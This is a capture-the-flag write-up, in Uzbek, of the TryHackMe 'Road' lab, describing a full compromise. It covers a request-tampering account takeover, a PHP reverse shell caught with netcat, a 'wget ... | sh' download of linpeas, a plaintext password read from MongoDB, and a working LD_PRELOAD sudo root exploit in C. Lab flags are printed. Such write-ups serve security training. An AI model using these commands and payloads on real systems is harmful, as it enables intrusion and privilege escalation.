# Road

Room: https://tryhackme.com/room/road

## Razvetka
### PortScanning:
**Buyruq:**

```
rustscan -a 10.10.174.160 — -sV
```

**Natija:**

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



80 portda veb sayt ishlayotgan ekan.



## Web Hacking

![](https://github.com/akhatkulov/Write-Ups/blob/main/TryHackme/Pictures/road1.jpg?raw=true)

Ro'yxatdan o'tdik va kirdik.



http://10.10.174.160/v2/profile.php
Qismiga nazar soldik. Qiziq)

![](https://github.com/akhatkulov/Write-Ups/blob/main/TryHackme/Pictures/road2.jpg?raw=true)

Va yana qiziq

![rasm](https://github.com/akhatkulov/Write-Ups/blob/main/TryHackme/Pictures/road3.jpg?raw=true)

Endi judayam qiziq.

![rasm](https://github.com/akhatkulov/Write-Ups/blob/main/TryHackme/Pictures/road4.jpg?raw=true)

front-enddan userni o'zgartirib bo'lmaydigan qilgan ekan, requestni tutib o'zgartirib ko'rish kerak.

Uni quyidagicha qilamiz.

![rassm](https://github.com/akhatkulov/Write-Ups/blob/main/TryHackme/Pictures/road5.jpg?raw=true)

![rasm](https://github.com/akhatkulov/Write-Ups/blob/main/TryHackme/Pictures/road6.jpg?raw=true)

Admin hisobiga kirdik...

profil qismini taxlil qilsak...

rasmlar qayerga joylashayotganini bildik reverse shell yuklab ko'rish kerak. Profilga qo'yilgan rasm yuklanarkan.

![rasm](https://github.com/akhatkulov/Write-Ups/blob/main/TryHackme/Pictures/road7.jpg?raw=true)

Reverse shell yuklashga urinib ko'ramiz.

reverse shell tayyorlash:

```
https://github.com/akhatkulov/HackBox/blob/main/reverse-shell.php
```

reverse shellni tutish:

```
nc -nvlp 4444
```

Natija:

```
  nc -nvlp 4444
Connection from 10.10.174.160:49808
Linux sky 5.4.0-73-generic #82-Ubuntu SMP Wed Apr 14 17:39:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 20:27:50 up  1:52,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

Foydalanuvchilar:

```
$ ls /home
webdeveloper
```

user.txt'ni qo'lga kiritish:

```
$ cd /home/webdeveloper
$ ls
user.txt
$ cat user.txt
63191e4ece37523c9fe6bb62a5e64d45
```

TTY ochamiz:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```



## PrevEsc

Tizimni tahlil qilishda yordam berishi uchun bizga Linpeas.sh dasturi kerak bo'ladi.

Dasturni yuklab olib uni serverga olib o'tamiz.

Yuklab olish:

```
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

Serverga olib o'tish uchun kompyuterimizdan http.server ochamiz:

```
sudo python3 -m http.server 80
```

Serverdan faylni  /tpm papkasiga yuklaymiz:

```
www-data@sky:/home/webdeveloper$ cd /tmp
cd /tmp
www-data@sky:/tmp$ wget 10.8.24.135/linpeas.sh
wget 10.8.24.135/linpeas.sh
--2025-08-02 22:05:50--  http://10.8.24.135/linpeas.sh
Connecting to 10.8.24.135:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 956174 (934K) [application/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 933.76K   569KB/s    in 1.6s    

2025-08-02 22:05:53 (569 KB/s) - ‘linpeas.sh’ saved [956174/956174]
```

Ishga tushirish:

```
bash linpeas.sh
```

Meni qiziqtirgan hisobot qismi:

```
Possible mongo anonymous authentication
-rw-r--r-- 1 root root 626 Dec 19  2013 /etc/mongod.conf
storage:
  dbPath: /var/lib/mongodb
  journal:
    enabled: true
systemLog:
  destination: file
  logAppend: true
  path: /var/log/mongodb/mongod.log
net:
  port: 27017
  bindIp: 127.0.0.1
processManagement:
  timeZoneInfo: /usr/share/zoneinfo
```

/etc/mongod.conf fayl tarkibi:

```
www-data@sky:/tmp$ cat /etc/mongod.conf
cat /etc/mongod.conf
# mongod.conf

# for documentation of all options, see:
#   http://docs.mongodb.org/manual/reference/configuration-options/

# Where and how to store data.
storage:
  dbPath: /var/lib/mongodb
  journal:
    enabled: true
#  engine:
#  mmapv1:
#  wiredTiger:

# where to write logging data.
systemLog:
  destination: file
  logAppend: true
  path: /var/log/mongodb/mongod.log

# network interfaces
net:
  port: 27017
  bindIp: 127.0.0.1


# how the process runs
processManagement:
  timeZoneInfo: /usr/share/zoneinfo

#security:

#operationProfiling:

#replication:

#sharding:

## Enterprise-Only Options:

#auditLog:

#snmp:
```

**Mongo**ga kirib olamiz:

```
mongo
```

So'ng DBni ko'zdan kechiramiz:

```
> show databases
shshow databases
admin   0.000GB
backup  0.000GB
config  0.000GB
local   0.000GB
> use backup
ususe backup
switched to db backup
> show collections
shshow collections
collection
user
> db.user.find()
dbdb.user.find()
{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "BahamasChapp123!@#" }
{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }
```

**webdeveloper**ning paroli topildi sinab ko'ramiz.

```
www-data@sky:/tmp$ su webdeveloper
su webdeveloper
Password: BahamasChapp123!@#

webdeveloper@sky:/tmp$ 
```

O'xshadi!

Bu userda bor imkoniyat:

```
webdeveloper@sky:~$ sudo -l
sudo -l
Matching Defaults entries for webdeveloper on sky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on sky:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
```



Men `/usr/bin/sky_backup_utility` dasturidan foydalanishga harakat qildim, lekin hech nima ishlamadi.

Tajriba orqali bildimki, `LD_PRELOAD` o‘rnatilgan va bu orqali root huquqlarini olish uchun exploit mavjud.

Yana, HackTricks maqolasidan exploit kodidan foydalandim:

------

1. Katalogni `/tmp` ga o‘zgartiring:

   ```bash
   cd /tmp
   ```

2. Istalgan nomdagi C fayl yarating:

   ```bash
   nano pe.c
   ```

3. Quyidagi payload (kodni) joylashtiring va faylni saqlang:

   ```c
   #include <stdio.h>
   #include <sys/types.h>
   #include <stdlib.h>
   
   void _init() {
       unsetenv("LD_PRELOAD");
       setgid(0);
       setuid(0);
       system("/bin/bash");
   }
   ```

4. Faylni quyidagicha kompilyatsiya qiling:

   ```bash
   gcc -fPIC -shared -nostartfiles -o pe.so pe.c
   ```

5. Shared library’ni preload qilib ishga tushiring:

   ```bash
   sudo LD_PRELOAD=/tmp/pe.so /usr/bin/sky_backup_utility
   ```

6. Endi sizda root huquqlari mavjud!



root.txt'ni qo'lga kiritish:

```
root@sky:~# cat /root/root.txt
3a62d897c40a815ecbe267df2f533ac6
```

